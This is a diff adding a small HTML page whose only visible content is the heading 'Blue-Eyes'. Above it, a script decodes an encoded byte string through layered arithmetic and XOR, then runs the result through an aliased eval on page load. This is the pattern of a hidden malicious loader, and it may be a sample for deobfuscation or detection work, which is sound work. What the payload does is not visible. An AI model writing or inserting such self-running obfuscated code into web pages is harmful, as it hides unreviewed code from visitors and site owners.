@@ -1,0 +1,41 @@
+<html>
+  <body>
+    <!-- Xn = ~(Xn - Xn-1) & 0XFF -->
+    <script>
+      var cz="",dz="",aa,ez=new Array(),fz;
+      function az(bz)
+      {
+        for(aa=0; aa<fz.length; aa++)
+            ez[aa]=fz.charCodeAt(aa);
+        aa="aa=45; while(true){if(aa<3)break;ez[aa]=(ez[aa]-ez[aa-1])&0xff;aa--;}";
+        eval(aa);
+        aa=45;
+        while(aa>=3)
+        {
+          ez[aa]=(((((ez[aa]+ez[aa-1])&0xff)-ez[2])&0xff)>>1)|((((((ez[aa]+ez[aa-1])&0xff)-ez[2])&0xff)<<7)&0xff);
+          aa--;
+        }
+        aa="aa=43;for(;;aa--){if(aa<2)break;ez[aa]=(((ez[aa]+ez[aa-1])&0xff)>>3)|((((ez[aa]+ez[aa-1])&0xff)<<5)&0xff);ez[aa]=((ez[aa]<<1)&0xff)|(ez[aa]>>7);}";
+        eval(aa);
+        fz="";
+        for(aa=1;aa<ez.length-1;aa++)
+          if(aa%8)fz+=String.fromCharCode(ez[aa]^bz);
+        aa=eval;
+        aa(fz);
+      }
+      fz=
+      "]\x80\xfa\xd2\xb9\xcd\xb8\x92\x16\x04\\V\xb2\x11\xe1\x9c\x8d\xb0\xc3\x12\xc1\xee\x88\xe2\xf4\xb1\x070\n&\xed\xccN\xd5\x91\x9b\xfe\xf0ku\xa7\\cz\x84\x8f\x04";
+      az(247);
+    </script>
+    <script>
+       var u=2;
+       for(;u==1;u++);
+    </script>
+    <br><br><br>
+    <center>
+      <h3>
+        <p>Blue-Eyes</p>
+      </h3>
+    </center>
+  </body>
+</html>
